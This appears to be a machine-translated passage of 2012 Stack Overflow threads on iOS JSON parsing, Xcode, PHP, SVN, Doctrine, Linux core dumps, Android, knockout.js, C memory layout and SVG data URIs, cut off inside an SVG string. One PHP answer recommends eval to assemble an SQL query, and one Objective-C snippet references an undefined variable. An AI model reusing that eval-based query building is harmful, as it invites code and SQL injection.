由于我将 web 服务响应转换为 Json 并分配到 NSDictionary。当我打印出字典中的内容时，它会给出下面的输出。我的问题是如何从此输出中获取电子邮件和密码值？

关键是帖子，价值是

```
(
        {
        post =         {
            "active_flag" = Y;
            email = "g.amit@jasapp.com";
            "first_name" = amit;
            "last_name" = gupta;
            "member_id" = 17;
            password = amitgupta;
        };
    }
) 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-10-06T13:59:43.497

```
 NSMutableDictionary *temDict = [self.YourAarray objectAtIndex:0];  
 NSlog(@"%@",[temDict  objectForKey:@"email"]);
 NSlog(@"%@",[currentHighscore objectForKey:@"password"]); 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-10-06T14:05:26.943

例如，如果`NSDictionary`您从 JSON 创建的名称为`jsonDict`，则以下代码应该可以工作：

```
NSDictionary *post = [jsonDict objectForKey:@"post"];
NSString *email = [post objectForKey:@"email"];
NSString *password = [post objectForKey:@"password"]; 
```

# xcode - 在 Xcode4 中的项目之间复制组

> ID：12760209
> 
> 赞同：2
> 
> 时间：2012-10-06T13:29:22.407
> 
> 标签：xcode, xcode4

存在关于这个主题的几个较早的问题（比如[这个](https://stackoverflow.com/questions/910132/xcode-groups-files-how-can-i-copy-files-from-project-a-into-project-b-without)），但我找不到 Xcode 4 的有用提示，所以..

**是否可以将一个项目组（可能包含磁盘上不同文件夹中的数百个文件）从一个项目复制到另一个项目？**

即，在为特定项目精心设置所有依赖项之后，我可以继续将该组（如在“黄色文件夹”中）复制到新创建的项目中吗？

如果它在 Xcode 4 中是可能的，它至少不是直截了当的

*   **Xcode4 中的组禁用**复制和粘贴****
***   **拖动**组不起作用，因为接收项目不会接受拖动**

 **任何提示表示赞赏。

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2012-10-22T11:25:27.177

好的，这是我发现的最好的解决方法：

*   创建一个新的**工作区**
*   **添加**您要将组从一个复制到另一个的项目
*   **在项目之间复制组！**

而已。之后您可以保留或删除工作区，因为它不会直接影响其中包含的项目。

有点笨拙但比其他解决方法更快 - 至少在 XCode 4.x 添加对项目之间直接复制的支持之前。**

# c++ - Syslog RFC 5424 客户端库 - C++

> ID：12760212
> 
> 赞同：5
> 
> 时间：2012-10-06T13:29:42.563
> 
> 标签：c++, c, logging, syslog

您是否知道 C++（甚至 C，绑定不是很难编写）中的任何体面的许可（LGPL）许可（或没有，在这种情况下我会使用它作为参考）网络系统日志库（RFC5424）。

我找到[了 liblogging.org](http://www.liblogging.org/)，但它在 2005-8 年几乎被废弃了。

想法？

# php - PHP：评估字符串内的值

> ID：12760214
> 
> 赞同：0
> 
> 时间：2012-10-06T13:29:55.947
> 
> 标签：php, string, eval

我有这个字符串 ($query) 从 preg_replace 返回

```
'SELECT ({$array["sum"]}/ 5)' 
```

我该如何评估它，以便结果`'SELECT (100/5)'`例如！

我试过

```
eval($query) 
```

但是没有成功！

你有更好的主意吗？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-10-06T13:30:40.857

只需将单引号替换为`'`双引号即可`"`。

```
"SELECT ({$array["sum"]}/ 5)" 
```

在用户输入`eval()`期间或同时使用它不是一个好主意。`$_POST`只是一个建议。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-10-06T13:42:59.633

你没有使用 eval 权利：

```
$evaluated = eval("return $query;"); 
```

注意你没有任何语法错误。当您以这种方式构建 SQL 查询时，您也可能会做错。只是说，我希望你够老。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-10-06T13:35:37.677

只需将它们与操作员粘合在一起即可`.`：

```
$array['sum'] = 100;
echo 'SELECT (' . $array['sum' ] . ' / 5)'; 
```

将导致：

```
SELECT (100 / 5) 
```

# svn - 从同一台机器上的另一个引导访问 TortoiseSVN 本地存储库？

> ID：12760215
> 
> 赞同：1
> 
> 时间：2012-10-06T13:30:02.033
> 
> 标签：svn, tortoisesvn, multiboot

有没有办法从同一台机器上的另一个操作系统访问本地 TortoiseSVN 存储库？

当我尝试从另一个操作系统访问它时，我收到“无法打开到 URL 的 ra_local 会话”错误。我必须设置SVN服务器吗？

谢谢！

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-10-06T14:14:52.367

您始终可以使用具有完整路径的本地 URL，如下所示：

```
file:///full/path/to/repository 
```

注意协议标识符（'file:'）后面的 3 个斜杠（'/'）。

在 Windows 上，它归结为：

```
file:///d:/full/path/to/repo 
```

（网址中没有反斜杠！！）

不用说，您在两台机器上都需要正确的 SVN 版本。没有权限系统。您可以读取和写入完整的存储库文件结构（无论如何您都拥有完整的文件访问权限）。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-10-06T17:35:37.347

是的，你真的应该在另一个系统上设置一个合适的 SVN 服务器。否则，您需要确保 SVN 版本在操作系统之间保持同步。

# php - 学说事件onflush

> ID：12760219
> 
> 赞同：1
> 
> 时间：2012-10-06T13:30:15.380
> 
> 标签：php, symfony, doctrine

类 Doctrine\ORM\Event\LifecycleEventArgs 有方法 getEntity() 用于查看 get Entity->getId(); 修改了什么对象 ID。

我使用方法 public function onFlush(OnFlushEventArgs $eventArgs) 。怎样才能看到已经插入的对象的ID呢？

```
 foreach ($uow->getScheduledEntityInsertions() AS $entity) {
        if (!$entity instanceof Modificacion) {
        $modificacion = new Modificacion();
        $modificacion->setFechamod(new \DateTime('now'));          
        $className = join('', array_slice(explode('\\', get_class($entity)), -1));
        $modificacion->setEntidad($className);         
        $modificacion->setIdentificador($eventArgs->getEntity()->getId());//not working
        $modificacion->setTipo('Inserción');
        $securityContext = $this->container->get('security.context');
        $modificacion->setEmpleado($securityContext->getToken()->getUser());
        $modificacion->setInfo('');
        $em->persist($modificacion);
        $classMetadata = $em->getClassMetadata(get_class($modificacion));
        $uow->computeChangeSet($classMetadata, $modificacion);
                        }
                    } 
```

提前致谢。

# linux - 无法为我崩溃的程序创建核心文件

> ID：12760220
> 
> 赞同：10
> 
> 时间：2012-10-06T13:30:30.717
> 
> 标签：linux, file, gdb, coredump

我正在使用 Ubuntu 12.04 LTS。我写了一个简单的程序如下创建崩溃

```
// null.c
#include<stdio.h>

int main()
{
   int *p = NULL;
   int k=*p;
   printf("%d",sizeof(0));
   return 0;
} 
```

现在我运行“gcc -g null.c”，然后运行“./a.out”，输出符合预期。

```
Segmentation fault (core dumped) 
```

现在我想使用 gdb 查看核心转储文件。我做了以下事情

1.  我检查了当前目录，没有核心转储文件
2.  我尝试使用内容“core.%e.%p”更改 /proc/sys/kernel/core_pattern。但我无法写入文件。它说“Fsync 失败”。
3.  我使用了“sudo vi /proc/sys/kernel/core_pattern”。仍然无法写入文件。

我想在当前目录中创建核心转储。现在做什么？

* * *

## 回答 #1

> 赞同：25
> 
> 时间：2012-10-06T14:13:40.703

您真正的问题似乎不是“我的核心转储在哪里”，而是“我该如何修改`/proc/sys/kernel/core_pattern`”。

```
sudo bash -c 'echo core.%e.%p > /proc/sys/kernel/core_pattern' 
```

应该做的伎俩。

* * *

## 回答 #2

> 赞同：4
> 
> 时间：2012-10-06T13:43:02.910

您需要使用以下命令调整核心转储大小限制：

> ulimit -S -c*最大核心转储大小*

该值以 Kb 为单位。

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2012-10-06T17:15:40.607

您不需要使用核心模式。它只是以那种格式转储 %e.%p

你需要做的是#ulimit -c unlimited

并检查#ulimit -a

并确认核心文件大小是否设置正确。之后，您将获得 core.pid 的核心。

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2014-08-06T16:30:43.107

我的理解是使用 ulimit 不是永久的，即如果你重新启动，那么限制会回到 0。要拥有无限永久，你需要更改 /etc/security/limits.conf。同样对于核心模式等，更改 /etc/sysctl.conf。

# android-intent - 从 Webview 调用新活动

> ID：12760223
> 
> 赞同：1
> 
> 时间：2012-10-06T13:30:51.740
> 
> 标签：android-intent

我想从 webview 调用一个活动

该应用程序崩溃了......但它可以作为一个没有 webview 的其他人的活动

我错过了什么？

谢谢你。

公共类 AndroidInterface 扩展 Activity{ 上下文 mContext;

```
AndroidInterface(Context c) {
    mContext = c;
}

public void newactivity(){

    Intent intent = new Intent(mContext, App2Activity.class);
    startActivity(intent);
}

    public void showToast(String toast) {

    Toast.makeText(mContext, toast, Toast.LENGTH_LONG).show();
} 
```

}

通过javascript我只能叫toast而不是activiy ...

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-10-06T13:41:22.560

尝试使用 WebView 中的 Java 代码。例如看这里：[http ://android-er.blogspot.com/2011/10/call-javascript-inside-webview-from.html](http://android-er.blogspot.com/2011/10/call-javascript-inside-webview-from.html)

# php - facebook graph api：将外部 URL 作为图像添加到 EVENT

> ID：12760224
> 
> 赞同：1
> 
> 时间：2012-10-06T13:30:52.890
> 
> 标签：php, facebook, events, facebook-graph-api

我使用以下参数通过 facebook graph api 创建事件

```
$attachment =  array(   'access_token'  => $token,
                          'name' => $event_name,
                                'start_time' => $event_start,
                                'privacy_type' => $event_privacy
 ); 
```

如何将外部 URL 作为图像附加到其中的事件，

Ps：我使用 curl 所以我需要使用外部图片 url

# javascript - 使用 knockout.js 插入、删除和更新可观察元素

> ID：12760227
> 
> 赞同：1
> 
> 时间：2012-10-06T13:31:02.387
> 
> 标签：javascript, html, knockout.js

我正在插入一个类似使用敲除（observableArray）的列表：

1.苹果**删除2.香蕉****删除**
3. 芒果**删除**
4. 菠萝**删除**

 ****当我删除“ *2.banana **delete*** ”时，列表如下所示：

1.苹果**删除**
3.芒果**删除**
4.菠萝**删除**

但我希望它看起来像：

1.苹果**删除**
2.芒果**删除**
3.菠萝**删除**

数组就像：`this.list=ko.observableArray({num:1,name:apple});` 我正在使用“foreach”和“push”函数来添加更多元素，并使用“remove”函数来删除。

当我删除任何元素时，请帮助我更新列表“num”。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-10-06T14:03:30.590

您可以在 foreach 模板中使用 $index 来显示数字。这是 Knockout 2.1 的新功能，如下所示：[http ://www.knockmeout.net/2012/05/knockout-2-dot-1-is-out.html](http://www.knockmeout.net/2012/05/knockout-2-dot-1-is-out.html)****

# c - char指针和数组的栈指针区别

> ID：12760229
> 
> 赞同：2
> 
> 时间：2012-10-06T13:31:11.737
> 
> 标签：c

我有一个`char`数组如下：

```
 char buffer[100] 
```

另一个`char`指针如下：

```
 char *buffer
 buffer = malloc(100) 
```

当我使用[GDB](http://en.wikipedia.org/wiki/GNU_Debugger)检查堆栈指针时，它们实际上是不同的。为什么？

* * *

## 回答 #1

> 赞同：14
> 
> 时间：2012-10-06T13:38:54.910

那是因为`char buffer[100]`将被分配到堆栈上，这将占用 100 字节的存储空间。因此堆栈指针`esp`/`rsp`将指向较低的内存（堆栈向下增长）

```
 +-    +------------+   <-- ebp
 |     |            |
 b     +------------+
 u     |            |
 f     +------------+
 f     |            |       holds 100 elements of buffer array       
 e     +------------+
 r          .
            .
 a          .
 r     +------------+
 r     |            |
 +-    +------------+  <-- esp 
```

并且在`char *buffer`只有一种`char *`类型对象的内存（`sizeof (char *)`）的情况下将在堆栈上分配。当您执行时`buffer = malloc (100)`，将返回保证 100 字节的内存块的基地址。这个分配的内存通常取自堆。因此现在`buffer`保存了刚刚分配的内存块的基地址。所以，在这种情况下，因为内存来自堆，而堆栈只保存`char *`类型对象，因此堆栈指针位于更高的位置（使堆栈向下增长）

```
 +------------+   <-- ebp
    |   0xabcd   |             buffer , char * type
    +-----+------+   <-- esp
          | 
          |
          |             0xabcd 0xabce
          |             +-----+-----+-----+       +-----+-----+
          +------------>|     |     |     | . . . |     |     | 
                        +-----+-----+-----+       +-----+-----+
                                     0xabcf . . .

                        |                                     |
                        +------ 100 bytes mem block in heap --+ 
```

另请注意 Richard J. Ross III 的评论。

# html - svg 到画布 -- 歌剧

> ID：12760230
> 
> 赞同：0
> 
> 时间：2012-10-06T13:31:15.193
> 
> 标签：html, svg, html5-canvas, opera

我有这段代码在 Chromium 和 Firefox 中运行良好，但 Opera 不会触发加载事件，因为它无法处理图像数据。如果我将数据设置为常规 jpeg，它可以正常工作，但不适用于 svg。有什么解决办法吗？

```
var img = new Image();

var that = this;

img.onload = function(){ onCacheCreated.call( that, img ); }

img.src = "data:image/svg+xml;base64," 
    + btoa( ( new XMLSerializer() ).serializeToString( this._dom ) ); 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-10-06T14:15:33.200

嗯，这里展示了相当有趣的行为范围。

使它特别有趣的部分是它实际上*可以*加载 SVG。我尝试将其作为附加到的 base64 编码字符串和附加到`"data:image/svg+xml;base64,"` 的纯文本`"data:image/svg+xml,"`

“整洁”的部分是 - onload 事件永远不会触发。但是，如果我们创建一个 img 元素并将其添加到页面中，我们可以看到它在加载时显示。但同样，我们从来没有从它那里得到一个 onload 事件。

更奇怪的是：当我使用带有透明阴影、渐变和模糊的徽标时，渐变、模糊和阴影不起作用，但仅在以纯文本形式发送时。

更奇怪的是，Chrome 显示它们的方式相同，IE9 仅显示 base64 版本，Opera 显示两者，但外观截然不同。

也许您可以设置一个间隔计时器，然后检查正在加载的 img 元素的尺寸。有人会假设它们在加载之前和之后会有所不同。我必须检查这是否是处理（从未触发的）onload 事件的可行替代方案。

这是我使用的代码：

```
<!DOCTYPE>
<html>
<head>
<style>
</style>
<script>
function myInit()
{
    var img = new Image();
    document.body.appendChild(img);
    var imgStr = "data:image/svg+xml;base64,";
    imgStr += "PHN2ZwogICB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciCiAgIHhtbG5zOnhsaW5rPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5L3hsaW5rIgogICB4bWxuczppbmtzY2FwZT0iaHR0cDovL3d3dy5pbmtzY2FwZS5vcmcvbmFtZXNwYWNlcy9pbmtzY2FwZSIKICAgd2lkdGg9Ijg1IgogICBoZWlnaHQ9Ijg1Igo+CiAgPGRlZnMKICAgICBpZD0iZGVmczQxNzIiPgogICAgPHJhZGlhbEdyYWRpZW50CiAgICAgICBpbmtzY2FwZTpjb2xsZWN0PSJhbHdheXMiCiAgICAgICB4bGluazpocmVmPSIjbGluZWFyR3JhZGllbnQ0ODk5IgogICAgICAgaWQ9InJhZGlhbEdyYWRpZW50NDkwNyIKICAgICAgIGN4PSIyMTkuNjM0MzIiCiAgICAgICBjeT0iNTMuNDk5Mjc5IgogICAgICAgZng9IjIxOS42MzQzMiIKICAgICAgIGZ5PSI1My40OTkyNzkiCiAgICAgICByPSIxNS44OTA2MjUiCiAgICAgICBncmFkaWVudFRyYW5zZm9ybT0ibWF0cml4KC0zLjI3ODMwMzMsLTAuNzI4NTMzODUsMC42OTk5NTM0NCwtMy4xNDk2OTU0LDczOS4xNzMyMSwzNDUuMzE5OTUpIgogICAgICAgZ3JhZGllbnRVbml0cz0idXNlclNwYWNlT25Vc2UiIC8+CiAgICA8bGluZWFyR3JhZGllbnQKICAgICAgIGlkPSJsaW5lYXJHcmFkaWVudDQ4OTkiPgogICAgICA8c3RvcAogICAgICAgICBzdHlsZT0ic3RvcC1jb2xvcjojMDAwMDAwO3N0b3Atb3BhY2l0eToxOyIKICAgICAgICAgb2Zmc2V0PSIwIgogICAgICAgICBpZD0ic3RvcDQ5MDEiIC8+CiAgICAgIDxzdG9wCiAgICAgICAgIHN0eWxlPSJzdG9wLWNvbG9yOiNmN2I0YjQ7c3RvcC1vcGFjaXR5OjE7IgogICAgICAgICBvZmZzZXQ9IjEiCiAgICAgICAgIGlkPSJzdG9wNDkwMyIgLz4KICAgIDwvbGluZWFyR3JhZGllbnQ+CiAgICA8bGluZWFyR3JhZGllbnQKICAgICAgIGlua3NjYXBlOmNvbGxlY3Q9ImFsd2F5cyIKICAgICAgIHhsaW5rOmhyZWY9IiNsaW5lYXJHcmFkaWVudDQ5MTQiCiAgICAgICBpZD0ibGluZWFyR3JhZGllbnQ0OTIwIgogICAgICAgeDE9IjIxNi43MTc0NSIKICAgICAgIHkxPSItNTIuMDQ4NTUzIgogICAgICAgeDI9IjIxNS44MDM0NyIKICAgICAgIHkyPSI4NS4xNDE1MjUiCiAgICAgICBncmFkaWVudFVuaXRzPSJ1c2VyU3BhY2VPblVzZSIKICAgICAgIGdyYWRpZW50VHJhbnNmb3JtPSJ0cmFuc2xhdGUoLTE2NS4yNTk1MSwtMTUuOTQ2NDM5KSIgLz4KICAgIDxsaW5lYXJHcmFkaWVudAogICAgICAgaW5rc2NhcGU6Y29sbGVjdD0iYWx3YXlzIgogICAgICAgaWQ9ImxpbmVhckdyYWRpZW50NDkxNCI+CiAgICAgIDxzdG9wCiAgICAgICAgIHN0eWxlPSJzdG9wLWNvbG9yOiNmZmZmZmY7c3RvcC1vcGFjaXR5OjE7IgogICAgICAgICBvZmZzZXQ9IjAiCiAgICAgICAgIGlkPSJzdG9wNDkxNiIgLz4KICAgICAgPHN0b3AKICAgICAgICAgc3R5bGU9InN0b3AtY29sb3I6I2ZmZmZmZjtzdG9wLW9wYWNpdHk6MDsiCiAgICAgICAgIG9mZnNldD0iMSIKICAgICAgICAgaWQ9InN0b3A0OTE4IiAvPgogICAgPC9saW5lYXJHcmFkaWVudD4KICAgIDxmaWx0ZXIKICAgICAgIGNvbG9yLWludGVycG9sYXRpb24tZmlsdGVycz0ic1JHQiIKICAgICAgIGlua3NjYXBlOmNvbGxlY3Q9ImFsd2F5cyIKICAgICAgIGlkPSJmaWx0ZXI1MDk2Ij4KICAgICAgPGZlR2F1c3NpYW5CbHVyCiAgICAgICAgIGlua3NjYXBlOmNvbGxlY3Q9ImFsd2F5cyIKICAgICAgICAgc3RkRGV2aWF0aW9uPSIwLjU1NjQ1NjM3IgogICAgICAgICBpZD0iZmVHYXVzc2lhbkJsdXI1MDk4IiAvPgogICAgPC9maWx0ZXI+CiAgICA8ZmlsdGVyCiAgICAgICBjb2xvci1pbnRlcnBvbGF0aW9uLWZpbHRlcnM9InNSR0IiCiAgICAgICBpbmtzY2FwZTpjb2xsZWN0PSJhbHdheXMiCiAgICAgICBpZD0iZmlsdGVyNTA3NiI+CiAgICAgIDxmZUdhdXNzaWFuQmx1cgogICAgICAgICBpbmtzY2FwZTpjb2xsZWN0PSJhbHdheXMiCiAgICAgICAgIHN0ZERldmlhdGlvbj0iMS4yNTA3OTMzIgogICAgICAgICBpZD0iZmVHYXVzc2lhbkJsdXI1MDc4IiAvPgogICAgPC9maWx0ZXI+CiAgPC9kZWZzPgogIDxnCiAgICAgaW5rc2NhcGU6bGFiZWw9IkxheWVyIDEiCiAgICAgaW5rc2NhcGU6Z3JvdXBtb2RlPSJsYXllciIKICAgICBpZD0ibGF5ZXIxIj4KICAgIDxwYXRoCiAgICAgICBpZD0icGF0aDQ5MjIiCiAgICAgICBkPSJtIDIzLjc3MDQ2Nyw1MC42ODQxNTEgYyAtMTYuNzUxNzcwMiwyLjA0NzggLTI0LjM4NTkyMDIzLDExLjExMTMgLTE3LjA4NDI5MDIsMjAuMjM1NSA3LjMwMTYyMDIsOS4xMjQxIDI2Ljc3ODgwMDIsMTQuODU5NyA0My41MzA1NzAyLDEyLjgxMiAxNi43NTE3NywtMi4wNDc3IDI0LjQyNzMsLTExLjEwMjQgMTcuMTI1NjgsLTIwLjIyNjYgLTcuMzAxNjMsLTkuMTI0MiAtMjYuODIwMTksLTE0Ljg2ODYgLTQzLjU3MTk2LC0xMi44MjA5IHogbSAwLjcxOTcsMC44OTk0IGMgOC43NjMzNCwtMS4wNzEyIDIxLjQ5MjUsNS4wNDYzIDI4LjQwNDYyLDEzLjY3MzcgbCAtMTUuODk2MTEsMS45NTcgMTUuOTA2MjUsLTEuOTQ0NCBjIDYuOTA4ODksOC42MzM0IDUuMzcwNzYsMTYuNTAzMyAtMy4zOTc3NCwxNy41NzUxIC04Ljc2ODUsMS4wNzE5IC0yMS40NzQ2MiwtNS4wNTY3IC0yOC4zODM1MSwtMTMuNjkwMSAtNi45MDg4OSwtOC42MzM1IC01LjQwMjAxLC0xNi40OTk1IDMuMzY2NDksLTE3LjU3MTMgeiIKICAgICAgIHN0eWxlPSJvcGFjaXR5OjAuMzE4NTg0MDc7ZmlsbDojMDAwMDAwO2ZpbGwtb3BhY2l0eToxO3N0cm9rZTpub25lO2ZpbHRlcjp1cmwoI2ZpbHRlcjUwNzYpIgogICAgICAgaW5rc2NhcGU6Y29ubmVjdG9yLWN1cnZhdHVyZT0iMCIgLz4KICAgIDxwYXRoCiAgICAgICBzdHlsZT0iZmlsbDojZmYwMDAwO2ZpbGwtb3BhY2l0eToxO3N0cm9rZTpub25lIgogICAgICAgZD0ibSA1MC4zNjU0OTcsMi41MjIzMDA2IGMgLTE2Ljc1MTc3LDAgLTMwLjMxMjUsMTguMjcxMDcwNCAtMzAuMzEyNSw0MC43ODEyNTA0IDAsMjIuNTEwMiAxMy41NjA3Myw0MC43NSAzMC4zMTI1LDQwLjc1IDE2Ljc1MTc3LDAgMzAuMzQzNzUsLTE4LjIzOTggMzAuMzQzNzUsLTQwLjc1IDAsLTIyLjUxMDE4IC0xMy41OTE5OCwtNDAuNzgxMjUwNCAtMzAuMzQzNzUsLTQwLjc4MTI1MDQgeiBtIDAsMi4yMTg3NSBjIDguNzYzMzQsMCAxNS44OTg5NSwxNy4yNDQzOTA0IDE1LjkwNjI1LDM4LjUzMTMwMDQgbCAtMTUuOTA2MjUsMC4wMzEgMTUuOTA2MjUsMCBjIDAsMjEuMjk5NCAtNy4xMzc3NSwzOC41NjI1IC0xNS45MDYyNSwzOC41NjI1IC04Ljc2ODUsMCAtMTUuODc1LC0xNy4yNjMxIC0xNS44NzUsLTM4LjU2MjUgMCwtMjEuMjk5NDYgNy4xMDY1LC0zOC41NjI1NTA0IDE1Ljg3NSwtMzguNTYyNTUwNCB6IgogICAgICAgaWQ9InBhdGg0ODg3IgogICAgICAgaW5rc2NhcGU6Y29ubmVjdG9yLWN1cnZhdHVyZT0iMCIgLz4KICAgIDxwYXRoCiAgICAgICBzdHlsZT0iZmlsbDp1cmwoI3JhZGlhbEdyYWRpZW50NDkwNyk7ZmlsbC1vcGFjaXR5OjE7c3Ryb2tlOm5vbmUiCiAgICAgICBkPSJtIDUwLjM2NTQ5Nyw0Ljc0MTA1MDYgYyAtOC43Njg1LDAgLTE1Ljg3NSwxNy4yNjMwOTA0IC0xNS44NzUsMzguNTYyNTAwNCAwLDIxLjI5OTQgNy4xMDY1LDM4LjU2MjUgMTUuODc1LDM4LjU2MjUgOC43Njg1LDAgMTUuOTA2MjUsLTE3LjI2MzEgMTUuOTA2MjUsLTM4LjU2MjUgbCAtMi4zNzUsMCBjIDAsMjAuMjg1MyAtNi4wNzE0OCwzNi43MTg4IC0xMy41MzEyNSwzNi43MTg4IC03LjQ1OTc3LDAgLTEzLjUsLTE2LjQzMzUgLTEzLjUsLTM2LjcxODggMCwtMjAuMjg1MzQgNi4wNDAyMywtMzYuNzUwMDAwNCAxMy41LC0zNi43NTAwMDA0IDcuNDU1MzgsMCAxMy41MjUwNCwxNi40NDUzNzA0IDEzLjUzMTI1LDM2LjcxODgwMDQgbCAyLjM3NSwwIGMgLTAuMDA3LC0yMS4yODY5MSAtNy4xNDI5MSwtMzguNTMxMzAwNCAtMTUuOTA2MjUsLTM4LjUzMTMwMDQgeiIKICAgICAgIGlkPSJwYXRoNDg5MSIKICAgICAgIGlua3NjYXBlOmNvbm5lY3Rvci1jdXJ2YXR1cmU9IjAiIC8+CiAgICA8cGF0aAogICAgICAgc3R5bGU9ImZpbGw6dXJsKCNsaW5lYXJHcmFkaWVudDQ5MjApO2ZpbGwtb3BhY2l0eToxO3N0cm9rZTpub25lO2ZpbHRlcjp1cmwoI2ZpbHRlcjUwOTYpIgogICAgICAgZD0ibSA1MC4zNjU0OTcsMi41MjIzMDA2IGMgLTE2Ljc1MTc3LDAgLTMwLjMxMjUsMTguMjcxMDcwNCAtMzAuMzEyNSw0MC43ODEyNTA0IDAsMi42Mzc5IDAuMjA2NzMsNS4yMjA2IDAuNTYyNSw3LjcxODggNC41MDE2NCwzLjg3NTMgOS43MTMwOSw2LjkwODIgMTUuNDM3NSw4LjgxMjUgLTAuOTgzODQsLTUuMDE4MSAtMS41NjI1LC0xMC42MDI0IC0xLjU2MjUsLTE2LjUzMTMgMCwtMjEuMjk5NDEgNy4xMDY1LC0zOC41NjI1MDA0IDE1Ljg3NSwtMzguNTYyNTAwNCA4Ljc2MzM0LDAgMTUuODk4OTUsMTcuMjQ0MzkwNCAxNS45MDYyNSwzOC41MzEzMDA0IGwgLTE1LjkwNjI1LDAuMDMxIDE1LjkwNjI1LDAgYyAwLDUuOTI3NiAtMC41NDQzMSwxMS41MTM5IC0xLjUzMTI1LDE2LjUzMTIgNS43MTYzNiwtMS45MDQ2IDEwLjk0MTI3LC00Ljk0MTggMTUuNDM3NSwtOC44MTI1IDAuMzU2NTMsLTIuNDk4MSAwLjUzMTI1LC01LjA4MDggMC41MzEyNSwtNy43MTg3IDAsLTIyLjUxMDIzIC0xMy41OTE5OCwtNDAuNzgxMzAwNCAtMzAuMzQzNzUsLTQwLjc4MTMwMDQgeiIKICAgICAgIGlkPSJwYXRoNDkwOSIKICAgICAgIGlua3NjYXBlOmNvbm5lY3Rvci1jdXJ2YXR1cmU9IjAiIC8+CiAgPC9nPgo8L3N2Zz4K";
    img.src = imgStr;

    img = new Image();
    document.body.appendChild(img);
    var imgStr = "data:image/svg+xml,";
    imgStr += '<svg   xmlns="http://www.w3.org/2000/svg"   xmlns:xlink="http://www.w3.org/1999/xlink"   xmlns:inkscape="http://www.inkscape.org/namespaces/inkscape"   width="85"   height="85">  <defs     id="defs4172">    <radialGradient       inkscape:collect="always"       xlink:href="#linearGradient4899"       id="radialGradient4907"       cx="219.63432"       cy="53.499279"       fx="219.63432"       fy="53.499279"       r="15.890625"       gradientTransform="matrix(-3.2783033,-0.72853385,0.69995344,-3.1496954,739.17321,345.31995)"       gradientUnits="userSpaceOnUse" />    <linearGradient       id="linearGradient4899">      <stop         style="stop-color:#000000;stop-opacity:1;"         offset="0"         id="stop4901" />      <stop         style="stop-color:#f7b4b4;stop-opacity:1;"         offset="1"         id="stop4903" />    </linearGradient>    <linearGradient       inkscape:collect="always"       xlink:href="#linearGradient4914"       id="linearGradient4920"       x1="216.71745"       y1="-52.048553"       x2="215.80347"       y2="85.141525"       gradientUnits="userSpaceOnUse"       gradientTransform="translate(-165.25951,-15.946439)" />    <linearGradient       inkscape:collect="always"       id="linearGradient4914">      <stop         style="stop-color:#ffffff;stop-opacity:1;"         offset="0"         id="stop4916" />      <stop         style="stop-color:#ffffff;stop-opacity:0;"         offset="1"         id="stop4918" />    </linearGradient>    <filter       color-interpolation-filters="sRGB"       inkscape:collect="always"       id="filter5096">      <feGaussianBlur         inkscape:collect="always"         stdDeviation="0.55645637"         id="feGaussianBlur5098" />    </filter>    <filter       color-interpolation-filters="sRGB"       inkscape:collect="always"       id="filter5076">      <feGaussianBlur         inkscape:collect="always"         stdDeviation="1.2507933"         id="feGaussianBlur5078" />    </filter>  </defs>  <g     inkscape:label="Layer 1"     inkscape:groupmode="layer"     id="layer1">    <path       id="path4922"       d="m 23.770467,50.684151 c -16.7517702,2.0478 -24.38592023,11.1113 -17.0842902,20.2355 7.3016202,9.1241 26.7788002,14.8597 43.5305702,12.812 16.75177,-2.0477 24.4273,-11.1024 17.12568,-20.2266 -7.30163,-9.1242 -26.82019,-14.8686 -43.57196,-12.8209 z m 0.7197,0.8994 c 8.76334,-1.0712 21.4925,5.0463 28.40462,13.6737 l -15.89611,1.957 15.90625,-1.9444 c 6.90889,8.6334 5.37076,16.5033 -3.39774,17.5751 -8.7685,1.0719 -21.47462,-5.0567 -28.38351,-13.6901 -6.90889,-8.6335 -5.40201,-16.4995 3.36649,-17.5713 z"       style="opacity:0.31858407;fill:#000000;fill-opacity:1;stroke:none;filter:url(#filter5076)"       inkscape:connector-curvature="0" />    <path       style="fill:#ff0000;fill-opacity:1;stroke:none"       d="m 50.365497,2.5223006 c -16.75177,0 -30.3125,18.2710704 -30.3125,40.7812504 0,22.5102 13.56073,40.75 30.3125,40.75 16.75177,0 30.34375,-18.2398 30.34375,-40.75 0,-22.51018 -13.59198,-40.7812504 -30.34375,-40.7812504 z m 0,2.21875 c 8.76334,0 15.89895,17.2443904 15.90625,38.5313004 l -15.90625,0.031 15.90625,0 c 0,21.2994 -7.13775,38.5625 -15.90625,38.5625 -8.7685,0 -15.875,-17.2631 -15.875,-38.5625 0,-21.29946 7.1065,-38.5625504 15.875,-38.5625504 z"       id="path4887"       inkscape:connector-curvature="0" />    <path       style="fill:url(#radialGradient4907);fill-opacity:1;stroke:none"       d="m 50.365497,4.7410506 c -8.7685,0 -15.875,17.2630904 -15.875,38.5625004 0,21.2994 7.1065,38.5625 15.875,38.5625 8.7685,0 15.90625,-17.2631 15.90625,-38.5625 l -2.375,0 c 0,20.2853 -6.07148,36.7188 -13.53125,36.7188 -7.45977,0 -13.5,-16.4335 -13.5,-36.7188 0,-20.28534 6.04023,-36.7500004 13.5,-36.7500004 7.45538,0 13.52504,16.4453704 13.53125,36.7188004 l 2.375,0 c -0.007,-21.28691 -7.14291,-38.5313004 -15.90625,-38.5313004 z"       id="path4891"       inkscape:connector-curvature="0" />    <path       style="fill:url(#linearGradient4920);fill-opacity:1;stroke:none;filter:url(#filter5096)"       d="m 50.365497,2.5223006 c -16.75177,0 -30.3125,18.2710704 -30.3125,40.7812504 0,2.6379 0.20673,5.2206 0.5625,7.7188 4.50164,3.8753 9.71309,6.9082 15.4375,8.8125 -0.98384,-5.0181 -1.5625,-10.6024 -1.5625,-16.5313 0,-21.29941 7.1065,-38.5625004 15.875,-38.5625004 8.76334,0 15.89895,17.2443904 15.90625,38.5313004 l -15.90625,0.031 15.90625,0 c 0,5.9276 